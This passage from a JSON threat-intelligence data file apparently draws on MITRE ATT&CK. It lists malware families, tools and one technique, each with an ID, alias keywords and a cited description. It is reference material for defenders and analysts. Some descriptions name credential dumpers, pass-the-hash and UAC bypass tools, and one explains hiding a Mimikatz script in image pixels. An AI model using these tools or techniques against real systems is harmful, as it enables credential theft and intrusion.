    "description": "[Wiarp](https://attack.mitre.org/software/S0206) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Wiarp May 2012)",
    "example_uses": []
  },
  "malware--22addc7b-b39f-483d-979a-1b35147da5de": {
    "id": "S0059",
    "name": "WinMM",
    "examples": [],
    "similar_words": [
      "WinMM"
    ],
    "description": "[WinMM](https://attack.mitre.org/software/S0059) is a full-featured, simple backdoor used by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--a8d3d497-2da9-4797-8e0b-ed176be08654": {
    "id": "S0176",
    "name": "Wingbird",
    "examples": [],
    "similar_words": [
      "Wingbird"
    ],
    "description": "[Wingbird](https://attack.mitre.org/software/S0176) is a backdoor that appears to be a version of commercial software [FinFisher](https://attack.mitre.org/software/S0182). It is reportedly used to attack individual computers instead of networks. It was used by [NEODYMIUM](https://attack.mitre.org/groups/G0055) in a May 2016 campaign. (Citation: Microsoft SIR Vol 21) (Citation: Microsoft NEODYMIUM Dec 2016)",
    "example_uses": []
  },
  "malware--d3afa961-a80c-4043-9509-282cdf69ab21": {
    "id": "S0141",
    "name": "Winnti for Windows",
    "examples": [],
    "similar_words": [
      "Winnti",
      "Winnti for Windows"
    ],
    "description": "[Winnti for Windows](https://attack.mitre.org/software/S0141) is a modular remote access Trojan (RAT) that has been used likely by multiple groups to carry out intrusions in various regions since at least 2010, including by one group referred to as the same name, [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: Kaspersky Winnti April 2013)(Citation: Microsoft Winnti Jan 2017)(Citation: Novetta Winnti April 2015)(Citation: 401 TRG Winnti Umbrella May 2018). The Linux variant is tracked separately under [Winnti for Linux](https://attack.mitre.org/software/S0430).(Citation: Chronicle Winnti for Linux May 2019)",
    "example_uses": []
  },
  "malware--a19c49aa-36fe-4c05-b817-23e1c7a7d085": {
    "id": "S0041",
    "name": "Wiper",
    "examples": [],
    "similar_words": [
      "Wiper"
    ],
    "description": "[Wiper](https://attack.mitre.org/software/S0041) is a family of destructive malware used in March 2013 during breaches of South Korean banks and media companies. (Citation: Dell Wiper)",
    "example_uses": []
  },
  "malware--59a97b15-8189-4d51-9404-e1ce8ea4a069": {
    "id": "S0161",
    "name": "XAgentOSX",
    "examples": [],
    "similar_words": [
      "XAgentOSX",
      "OSX.Sofacy"
    ],
    "description": "[XAgentOSX](https://attack.mitre.org/software/S0161) is a trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007)  on OS X and appears to be a port of their standard [CHOPSTICK](https://attack.mitre.org/software/S0023) or XAgent trojan. (Citation: XAgentOSX 2017)",
    "example_uses": []
  },
  "malware--7343e208-7cab-45f2-a47b-41ba5e2f0fab": {
    "id": "S0117",
    "name": "XTunnel",
    "examples": [],
    "similar_words": [
      "XTunnel",
      "Trojan.Shunnael",
      "X-Tunnel",
      "XAPS"
    ],
    "description": "[XTunnel](https://attack.mitre.org/software/S0117) a VPN-like network proxy tool that can relay traffic between a C2 server and a victim. It was first seen in May 2013 and reportedly used by [APT28](https://attack.mitre.org/groups/G0007) during the compromise of the Democratic National Committee. (Citation: Crowdstrike DNC June 2016) (Citation: Invincea XTunnel) (Citation: ESET Sednit Part 2)",
    "example_uses": []
  },
  "malware--166c0eca-02fd-424a-92c0-6b5106994d31": {
    "id": "S0086",
    "name": "ZLib",
    "examples": [],
    "similar_words": [
      "ZLib"
    ],
    "description": "[ZLib](https://attack.mitre.org/software/S0086) is a full-featured backdoor that was used as a second-stage implant during [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) since at least 2014. [ZLib](https://attack.mitre.org/software/S0086) is malware and should not be confused with the legitimate compression library from which its name is derived.(Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--a4f57468-fbd5-49e4-8476-52088220b92d": {
    "id": "S0251",
    "name": "Zebrocy",
    "examples": [],
    "similar_words": [
      "Zebrocy"
    ],
    "description": "[Zebrocy](https://attack.mitre.org/software/S0251) is a Trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007) since at least November 2015. The malware comes in several programming language variants, including C++, Delphi, AutoIt, C#, VB.NET, and Golang. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: CISA Zebrocy Oct 2020) ",
    "example_uses": []
  },
  "malware--4ab44516-ad75-4e43-a280-705dc0420e2f": {
    "id": "S0230",
    "name": "ZeroT",
    "examples": [],
    "similar_words": [
      "ZeroT"
    ],
    "description": "[ZeroT](https://attack.mitre.org/software/S0230) is a Trojan used by [TA459](https://attack.mitre.org/groups/G0062), often in conjunction with [PlugX](https://attack.mitre.org/software/S0013). (Citation: Proofpoint TA459 April 2017) (Citation: Proofpoint ZeroT Feb 2017)",
    "example_uses": []
  },
  "malware--552462b9-ae79-49dd-855c-5973014e157f": {
    "id": "S0027",
    "name": "Zeroaccess",
    "examples": [],
    "similar_words": [
      "Zeroaccess",
      "Trojan.Zeroaccess"
    ],
    "description": "[Zeroaccess](https://attack.mitre.org/software/S0027) is a kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that attempts to add victims to the ZeroAccess botnet, often for monetary gain. (Citation: Sophos ZeroAccess)",
    "example_uses": []
  },
  "malware--0f1ad2ef-41d4-4b7a-9304-ddae68ea3005": {
    "id": "S0202",
    "name": "adbupd",
    "examples": [],
    "similar_words": [
      "adbupd"
    ],
    "description": "[adbupd](https://attack.mitre.org/software/S0202) is a backdoor used by [PLATINUM](https://attack.mitre.org/groups/G0068) that is similar to [Dipsind](https://attack.mitre.org/software/S0200). (Citation: Microsoft PLATINUM April 2016)",
    "example_uses": []
  },
  "malware--88c621a7-aef9-4ae0-94e3-1fc87123eb24": {
    "id": "S0032",
    "name": "gh0st RAT",
    "examples": [],
    "similar_words": [
      "gh0st RAT",
      "gh0st"
    ],
    "description": "[gh0st RAT](https://attack.mitre.org/software/S0032) is a remote access tool (RAT). The source code is public and it has been used by multiple groups.(Citation: FireEye Hacking Team)(Citation: Arbor Musical Chairs Feb 2018)(Citation: Nccgroup Gh0st April 2018)",
    "example_uses": []
  },
  "malware--9e2bba94-950b-4fcf-8070-cb3f816c5f4e": {
    "id": "S0071",
    "name": "hcdLoader",
    "examples": [],
    "similar_words": [
      "hcdLoader"
    ],
    "description": "[hcdLoader](https://attack.mitre.org/software/S0071) is a remote access tool (RAT) that has been used by [APT18](https://attack.mitre.org/groups/G0026). (Citation: Dell Lateral Movement)",
    "example_uses": []
  },
  "malware--e8268361-a599-4e45-bd3f-71c8c7e700c0": {
    "id": "S0068",
    "name": "httpclient",
    "examples": [],
    "similar_words": [
      "httpclient"
    ],
    "description": "[httpclient](https://attack.mitre.org/software/S0068) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool that provides a limited range of functionality, suggesting it is likely used as a second-stage or supplementary/backup tool. (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--2cfe8a26-5be7-4a09-8915-ea3d9e787513": {
    "id": "S0278",
    "name": "iKitten",
    "examples": [],
    "similar_words": [
      "iKitten",
      "OSX/MacDownloader"
    ],
    "description": "[iKitten](https://attack.mitre.org/software/S0278) is a macOS exfiltration agent  (Citation: objsee mac malware 2017).",
    "example_uses": []
  },
  "malware--efece7e8-e40b-49c2-9f84-c55c5c93d05c": {
    "id": "S0283",
    "name": "jRAT",
    "examples": [],
    "similar_words": [
      "jRAT",
      "JSocket",
      "AlienSpy",
      "Frutas",
      "Sockrat",
      "Unrecom",
      "jFrutas",
      "Adwind",
      "jBiFrost",
      "Trojan.Maljava"
    ],
    "description": "[jRAT](https://attack.mitre.org/software/S0283) is a cross-platform, Java-based backdoor originally available for purchase in 2012. Variants of [jRAT](https://attack.mitre.org/software/S0283) have been distributed via a software-as-a-service platform, similar to an online subscription model.(Citation: Kaspersky Adwind Feb 2016) (Citation: jRAT Symantec Aug 2018)",
    "example_uses": []
  },
  "malware--800bdfba-6d66-480f-9f45-15845c05cb5d": {
    "id": "S0067",
    "name": "pngdowner",
    "examples": [],
    "similar_words": [
      "pngdowner"
    ],
    "description": "[pngdowner](https://attack.mitre.org/software/S0067) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool with limited functionality and no persistence mechanism, suggesting it is used only as a simple \"download-and-\nexecute\" utility. (Citation: CrowdStrike Putter Panda)",
    "example_uses": []
  },
  "malware--0817aaf2-afea-4c32-9285-4dcd1df5bf14": {
    "id": "S0248",
    "name": "yty",
    "examples": [],
    "similar_words": [
      "yty"
    ],
    "description": "[yty](https://attack.mitre.org/software/S0248) is a modular, plugin-based malware framework. The components of the framework are written in a variety of programming languages. (Citation: ASERT Donot March 2018)",
    "example_uses": []
  },
  "tool--30489451-5886-4c46-90c9-0dff9adc5252": {
    "id": "S0099",
    "name": "Arp",
    "examples": [],
    "similar_words": [
      "Arp",
      "arp.exe"
    ],
    "description": "[Arp](https://attack.mitre.org/software/S0099) displays and modifies information about a system's Address Resolution Protocol (ARP) cache. (Citation: TechNet Arp)",
    "example_uses": []
  },
  "tool--64764dc6-a032-495f-8250-1e4c06bdc163": {
    "id": "S0190",
    "name": "BITSAdmin",
    "examples": [],
    "similar_words": [
      "BITSAdmin"
    ],
    "description": "[BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft BITSAdmin)",
    "example_uses": []
  },
  "tool--c9cd7ec9-40b7-49db-80be-1399eddd9c52": {
    "id": "S0119",
    "name": "Cachedump",
    "examples": [],
    "similar_words": [
      "Cachedump"
    ],
    "description": "[Cachedump](https://attack.mitre.org/software/S0119) is a publicly-available tool that program extracts cached password hashes from a system’s registry. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--aafea02e-ece5-4bb2-91a6-3bf8c7f38a39": {
    "id": "S0154",
    "name": "Cobalt Strike",
    "examples": [],
    "similar_words": [
      "Cobalt Strike"
    ],
    "description": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, penetration testing tool which bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system. (Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002). (Citation: cobaltstrike manual)",
    "example_uses": []
  },
  "tool--cf23bf4a-e003-4116-bbae-1ea6c558d565": {
    "id": "S0095",
    "name": "ftp",
    "examples": [],
    "similar_words": [
      "FTP",
      "ftp.exe",
      "ftp"
    ],
    "description": "[ftp](https://attack.mitre.org/software/S0095) is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data.(Citation: Microsoft FTP)(Citation: Linux FTP)",
    "example_uses": []
  },
  "tool--4f45dfeb-fe51-4df0-8db3-edf7dd0513fe": {
    "id": "S0120",
    "name": "Fgdump",
    "examples": [],
    "similar_words": [
      "Fgdump"
    ],
    "description": "[Fgdump](https://attack.mitre.org/software/S0120) is a Windows password hash dumper. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--90ec2b22-7061-4469-b539-0989ec4f96c2": {
    "id": "S0193",
    "name": "Forfiles",
    "examples": [],
    "similar_words": [
      "Forfiles"
    ],
    "description": "[Forfiles](https://attack.mitre.org/software/S0193) is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts. (Citation: Microsoft Forfiles Aug 2016)",
    "example_uses": []
  },
  "tool--d5e96a35-7b0b-4c6a-9533-d63ecbda563e": {
    "id": "S0040",
    "name": "HTRAN",
    "examples": [],
    "similar_words": [
      "HTRAN",
      "HUC Packet Transmit Tool"
    ],
    "description": "[HTRAN](https://attack.mitre.org/software/S0040) is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. It can be used by adversaries to hide their location when interacting with the victim networks. (Citation: Operation Quantum Entanglement)(Citation: NCSC Joint Report Public Tools)",
    "example_uses": []
  },
  "tool--fbd727ea-c0dc-42a9-8448-9e12962d1ab5": {
    "id": "S0224",
    "name": "Havij",
    "examples": [],
    "similar_words": [
      "Havij"
    ],
    "description": "[Havij](https://attack.mitre.org/software/S0224) is an automatic SQL Injection tool distributed by the Iranian ITSecTeam security company. Havij has been used by penetration testers and adversaries. (Citation: Check Point Havij Analysis)",
    "example_uses": []
  },
  "tool--b52d6583-14a2-4ddc-8527-87fd2142558f": {
    "id": "S0231",
    "name": "Invoke-PSImage",
    "examples": [],
    "similar_words": [
      "Invoke-PSImage"
    ],
    "description": "[Invoke-PSImage](https://attack.mitre.org/software/S0231) takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords. (Citation: GitHub Invoke-PSImage)",
    "example_uses": []
  },
  "tool--c8655260-9f4b-44e3-85e1-6538a5f6e4f4": {
    "id": "S0250",
    "name": "Koadic",
    "examples": [],
    "similar_words": [
      "Koadic"
    ],
    "description": "[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool that is publicly available on GitHub. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants, and performs most of its operations using Windows Script Host.(Citation: Github Koadic)(Citation: Palo Alto Sofacy 06-2018)(Citation: MalwareBytes LazyScripter Feb 2021)",
    "example_uses": []
  },
  "tool--2fab555f-7664-4623-b4e0-1675ae38190b": {
    "id": "S0121",
    "name": "Lslsass",
    "examples": [],
    "similar_words": [
      "Lslsass"
    ],
    "description": "[Lslsass](https://attack.mitre.org/software/S0121) is a publicly-available tool that can dump active logon session password hashes from the lsass process. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--5a33468d-844d-4b1f-98c9-0e786c556b27": {
    "id": "S0179",
    "name": "MimiPenguin",
    "examples": [],
    "similar_words": [
      "MimiPenguin"
    ],
    "description": "[MimiPenguin](https://attack.mitre.org/software/S0179) is a credential dumper, similar to [Mimikatz](https://attack.mitre.org/software/S0002), designed specifically for Linux platforms. (Citation: MimiPenguin GitHub May 2017)",
    "example_uses": []
  },
  "tool--afc079f3-c0ea-4096-b75d-3f05338b7f60": {
    "id": "S0002",
    "name": "Mimikatz",
    "examples": [],
    "similar_words": [
      "Mimikatz"
    ],
    "description": "[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)",
    "example_uses": []
  },
  "tool--03342581-f790-4f03-ba41-e82e67392e23": {
    "id": "S0039",
    "name": "Net",
    "examples": [],
    "similar_words": [
      "Net",
      "net.exe"
    ],
    "description": "The [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.",
    "example_uses": []
  },
  "tool--a52edc76-328d-4596-85e7-d56ef5a9eb69": {
    "id": "S0122",
    "name": "Pass-The-Hash Toolkit",
    "examples": [],
    "similar_words": [
      "Pass-The-Hash Toolkit"
    ],
    "description": "[Pass-The-Hash Toolkit](https://attack.mitre.org/software/S0122) is a toolkit that allows an adversary to \"pass\" a password hash (without knowing the original password) to log in to systems. (Citation: Mandiant APT1)",
    "example_uses": []
  },
  "tool--b77b563c-34bb-4fb8-86a3-3694338f7b47": {
    "id": "S0097",
    "name": "Ping",
    "examples": [],
    "similar_words": [
      "ping.exe",
      "Ping"
    ],
    "description": "[Ping](https://attack.mitre.org/software/S0097) is an operating system utility commonly used to troubleshoot and verify network connections. (Citation: TechNet Ping)",
    "example_uses": []
  },
  "tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d": {
    "id": "S0194",
    "name": "PowerSploit",
    "examples": [],
    "similar_words": [
      "PowerSploit"
    ],
    "description": "[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)",
    "example_uses": []
  },
  "tool--ff6caf67-ea1f-4895-b80e-4bb0fc31c6db": {
    "id": "S0029",
    "name": "PsExec",
    "examples": [],
    "similar_words": [
      "PsExec"
    ],
    "description": "[PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.(Citation: Russinovich Sysinternals)(Citation: SANS PsExec)",
    "example_uses": []
  },
  "tool--cb69b20d-56d0-41ab-8440-4a4b251614d4": {
    "id": "S0192",
    "name": "Pupy",
    "examples": [],
    "similar_words": [
      "Pupy"
    ],
    "description": "[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)",
    "example_uses": []
  },
  "tool--da04ac30-27da-4959-a67d-450ce47d9470": {
    "id": "S0262",
    "name": "QuasarRAT",
    "examples": [],
    "similar_words": [
      "QuasarRAT",
      "xRAT"
    ],
    "description": "[QuasarRAT](https://attack.mitre.org/software/S0262) is an open-source, remote access tool that has been publicly available on GitHub since at least 2014. [QuasarRAT](https://attack.mitre.org/software/S0262) is developed in the C# language.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)",
    "example_uses": []
  },
  "tool--cde2d700-9ed1-46cf-9bce-07364fe8b24f": {
    "id": "S0075",
    "name": "Reg",
    "examples": [],
    "similar_words": [
      "Reg",
      "reg.exe"
    ],
    "description": "[Reg](https://attack.mitre.org/software/S0075) is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. (Citation: Microsoft Reg)\n\nUtilities such as [Reg](https://attack.mitre.org/software/S0075) are known to be used by persistent threats. (Citation: Windows Commands JPCERT)",
    "example_uses": []
  },
  "tool--a1dd2dbd-1550-44bf-abcc-1a4c52e97719": {
    "id": "S0174",
    "name": "Responder",
    "examples": [],
    "similar_words": [
      "Responder"
    ],
    "description": "Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (Citation: GitHub Responder)",
    "example_uses": []
  },
  "tool--d8d19e33-94fd-4aa3-b94a-08ee801a2153": {
    "id": "S0195",
    "name": "SDelete",
    "examples": [],
    "similar_words": [
      "SDelete"
    ],
    "description": "[SDelete](https://attack.mitre.org/software/S0195) is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. (Citation: Microsoft SDelete July 2016)",
    "example_uses": []
  },
  "tool--7fcbc4e8-1989-441f-9ac5-e7b6ff5806f1": {
    "id": "S0096",
    "name": "Systeminfo",
    "examples": [],
    "similar_words": [
      "systeminfo.exe",
      "Systeminfo"
    ],
    "description": "[Systeminfo](https://attack.mitre.org/software/S0096) is a Windows utility that can be used to gather detailed information about a computer. (Citation: TechNet Systeminfo)",
    "example_uses": []
  },
  "tool--2e45723a-31da-4a7e-aaa6-e01998a6788f": {
    "id": "S0057",
    "name": "Tasklist",
    "examples": [],
    "similar_words": [
      "Tasklist"
    ],
    "description": "The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)",
    "example_uses": []
  },
  "tool--ed7d0cb1-87a6-43b4-9f46-ef1bc56d6c68": {
    "id": "S0183",
    "name": "Tor",
    "examples": [],
    "similar_words": [
      "Tor"
    ],
    "description": "[Tor](https://attack.mitre.org/software/S0183) is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information. [Tor](https://attack.mitre.org/software/S0183) utilizes \"Onion Routing,\" in which messages are encrypted with multiple layers of encryption; at each step in the proxy network, the topmost layer is decrypted and the contents forwarded on to the next node until it reaches its destination. (Citation: Dingledine Tor The Second-Generation Onion Router)",
    "example_uses": []
  },
  "tool--102c3898-85e0-43ee-ae28-62a0a3ed9507": {
    "id": "S0116",
    "name": "UACMe",
    "examples": [],
    "similar_words": [
      "UACMe"
    ],
    "description": "[UACMe](https://attack.mitre.org/software/S0116) is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. (Citation: Github UACMe)",
    "example_uses": []
  },
  "tool--242f3da3-4425-4d11-8f5c-b842886da966": {
    "id": "S0005",
    "name": "Windows Credential Editor",
    "examples": [],
    "similar_words": [
      "Windows Credential Editor",
      "WCE"
    ],
    "description": "[Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping tool. (Citation: Amplia WCE)",
    "example_uses": []
  },
  "tool--96fd6cc4-a693-4118-83ec-619e5352d07d": {
    "id": "S0191",
    "name": "Winexe",
    "examples": [],
    "similar_words": [
      "Winexe"
    ],
    "description": "[Winexe](https://attack.mitre.org/software/S0191) is a lightweight, open source tool similar to [PsExec](https://attack.mitre.org/software/S0029) designed to allow system administrators to execute commands on remote servers. (Citation: Winexe Github Sept 2013) [Winexe](https://attack.mitre.org/software/S0191) is unique in that it is a GNU/Linux based client. (Citation: Überwachung APT28 Forfiles June 2015)",
    "example_uses": []
  },
  "tool--0c8465c0-d0b4-4670-992e-4eee8d7ff952": {
    "id": "S0110",
    "name": "at",
    "examples": [],
    "similar_words": [
      "at",
      "at.exe"
    ],
    "description": "[at](https://attack.mitre.org/software/S0110) is used to schedule tasks on a system to run at a specified date or time.(Citation: TechNet At)(Citation: Linux at)",
    "example_uses": []
  },
  "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc": {
    "id": "S0160",
    "name": "certutil",
    "examples": [],
    "similar_words": [
      "certutil",
      "certutil.exe"
    ],
    "description": "[certutil](https://attack.mitre.org/software/S0160) is a command-line utility that can be used to obtain certificate authority information and configure Certificate Services. (Citation: TechNet Certutil)",
    "example_uses": []
  },
  "tool--bba595da-b73a-4354-aa6c-224d4de7cb4e": {
    "id": "S0106",
    "name": "cmd",
    "examples": [],
    "similar_words": [
      "cmd",
      "cmd.exe"
    ],
    "description": "[cmd](https://attack.mitre.org/software/S0106) is the Windows command-line interpreter that can be used to interact with systems and execute other processes and utilities. (Citation: TechNet Cmd)\n\nCmd.exe contains native functionality to perform many operations to interact with the system, including listing files in a directory (e.g., <code>dir</code> (Citation: TechNet Dir)), deleting files (e.g., <code>del</code> (Citation: TechNet Del)), and copying files (e.g., <code>copy</code> (Citation: TechNet Copy)).",
    "example_uses": []
  },
  "tool--38952eac-cb1b-4a71-bad2-ee8223a1c8fe": {
    "id": "S0105",
    "name": "dsquery",
    "examples": [],
    "similar_words": [
      "dsquery",
      "dsquery.exe"
    ],
    "description": "[dsquery](https://attack.mitre.org/software/S0105) is a command-line utility that can be used to query Active Directory for information from a system within a domain. (Citation: TechNet Dsquery) It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.",
    "example_uses": []
  },
  "tool--b07c2c47-fefb-4d7c-a69e-6a3296171f54": {
    "id": "S0008",
    "name": "gsecdump",
    "examples": [],
    "similar_words": [
      "gsecdump"
    ],
    "description": "[gsecdump](https://attack.mitre.org/software/S0008) is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems. (Citation: TrueSec Gsecdump)",
    "example_uses": []
  },
  "tool--362dc67f-4e85-4562-9dac-1b6b7f3ec4b5": {
    "id": "S0101",
    "name": "ifconfig",
    "examples": [],
    "similar_words": [
      "ifconfig"
    ],
    "description": "[ifconfig](https://attack.mitre.org/software/S0101) is a Unix-based utility used to gather information about and interact with the TCP/IP settings on a system. (Citation: Wikipedia Ifconfig)",
    "example_uses": []
  },
  "tool--294e2560-bd48-44b2-9da2-833b5588ad11": {
    "id": "S0100",
    "name": "ipconfig",
    "examples": [],
    "similar_words": [
      "ipconfig",
      "ipconfig.exe"
    ],
    "description": "[ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)",
    "example_uses": []
  },
  "tool--65370d0b-3bd4-4653-8cf9-daf56f6be830": {
    "id": "S0175",
    "name": "meek",
    "examples": [],
    "similar_words": [
      "meek"
    ],
    "description": "[meek](https://attack.mitre.org/software/S0175) is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.",
    "example_uses": []
  },
  "tool--b35068ec-107a-4266-bda8-eb7036267aea": {
    "id": "S0102",
    "name": "nbtstat",
    "examples": [],
    "similar_words": [
      "nbtstat",
      "nbtstat.exe"
    ],
    "description": "[nbtstat](https://attack.mitre.org/software/S0102) is a utility used to troubleshoot NetBIOS name resolution. (Citation: TechNet Nbtstat)",
    "example_uses": []
  },
  "tool--5a63f900-5e7e-4928-a746-dd4558e1df71": {
    "id": "S0108",
    "name": "netsh",
    "examples": [],
    "similar_words": [
      "netsh",
      "netsh.exe"
    ],
    "description": "[netsh](https://attack.mitre.org/software/S0108) is a scripting utility used to interact with networking components on local or remote systems. (Citation: TechNet Netsh)",
    "example_uses": []
  },
  "tool--4664b683-f578-434f-919b-1c1aad2a1111": {
    "id": "S0104",
    "name": "netstat",
    "examples": [],
    "similar_words": [
      "netstat",
      "netstat.exe"
    ],
    "description": "[netstat](https://attack.mitre.org/software/S0104) is an operating system utility that displays active TCP connections, listening ports, and network statistics. (Citation: TechNet Netstat)",
    "example_uses": []
  },
  "tool--9de2308e-7bed-43a3-8e58-f194b3586700": {
    "id": "S0006",
    "name": "pwdump",
    "examples": [],
    "similar_words": [
      "pwdump"
    ],
    "description": "[pwdump](https://attack.mitre.org/software/S0006) is a credential dumper. (Citation: Wikipedia pwdump)",
    "example_uses": []
  },
  "tool--c11ac61d-50f4-444f-85d8-6f006067f0de": {
    "id": "S0103",
    "name": "route",
    "examples": [],
    "similar_words": [
      "route",
      "route.exe"
    ],
    "description": "[route](https://attack.mitre.org/software/S0103) can be used to find or change information within the local system IP routing table. (Citation: TechNet Route)",
    "example_uses": []
  },
  "tool--c9703cd3-141c-43a0-a926-380082be5d04": {
    "id": "S0111",
    "name": "schtasks",
    "examples": [],
    "similar_words": [
      "schtasks",
      "schtasks.exe"
    ],
    "description": "[schtasks](https://attack.mitre.org/software/S0111) is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time. (Citation: TechNet Schtasks)",
    "example_uses": []
  },
  "tool--33b9e38f-103c-412d-bdcf-904a91fff1e4": {
    "id": "S0227",
    "name": "spwebmember",
    "examples": [],
    "similar_words": [
      "spwebmember"
    ],
    "description": "[spwebmember](https://attack.mitre.org/software/S0227) is a Microsoft SharePoint enumeration and data dumping tool written in .NET. (Citation: NCC Group APT15 Alive and Strong)",
    "example_uses": []
  },
  "tool--9a2640c2-9f43-46fe-b13f-bde881e55555": {
    "id": "S0225",
    "name": "sqlmap",
    "examples": [],
    "similar_words": [
      "sqlmap"
    ],
    "description": "[sqlmap](https://attack.mitre.org/software/S0225) is an open source penetration testing tool that can be used to automate the process of detecting and exploiting SQL injection flaws. (Citation: sqlmap Introduction)",
    "example_uses": []
  },
  "tool--4fa49fc0-9162-4bdb-a37e-7aa3dcb6d38b": {
    "id": "S0123",
    "name": "xCmd",
    "examples": [],
    "similar_words": [
      "xCmd"
    ],
    "description": "[xCmd](https://attack.mitre.org/software/S0123) is an open source tool that is similar to [PsExec](https://attack.mitre.org/software/S0029) and allows the user to execute applications on remote systems. (Citation: xCmd)",
    "example_uses": []
  },
  "attack-pattern--cf7b3a06-8b42-4c33-bbe9-012120027925": {
    "id": "T1500",
    "name": "Compile After Delivery",
    "examples": [],
    "similar_words": [
      "Compile After Delivery"
    ],
    "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)\n",
    "example_uses": []
  },
